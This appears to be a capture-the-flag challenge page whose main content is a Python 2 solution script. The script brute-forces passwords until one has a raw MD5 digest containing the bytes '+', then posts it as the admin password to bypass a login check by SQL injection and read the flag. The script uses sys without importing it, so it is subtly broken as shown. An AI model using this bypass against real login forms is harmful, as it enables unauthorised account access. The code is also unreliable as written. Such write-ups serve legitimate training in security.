#### Goals
 * Get the flag

#### Solution
```python
#!/usr/bin/env python

import requests
import hashlib
import random
import string

def getMd5(word):
    m = hashlib.md5()
    m.update(word)
    return m.digest()

def getPassword():
    while True:
        password = ""
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        password += random.choice(string.letters)
        if "'+'" in getMd5(password):
            return password

if len(sys.argv) != 3:
    print "Usage: "
    print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
    exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

url = "http://%s:%d/" % (host, port)

print "[+] Searching password..."
password = getPassword()
print "[+] Found : [%s]" % (password)

data = {
    "username": "admin",
    "password": password,
}
response = requests.post(url, data=data)
print "-" * 16
print "[+] Content : "
print response.content
print "-" * 16
print "[+] Headers : "
print response.headers
print "-" * 16
print "[+] Flag : "
print response.headers["flag"]
```

#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
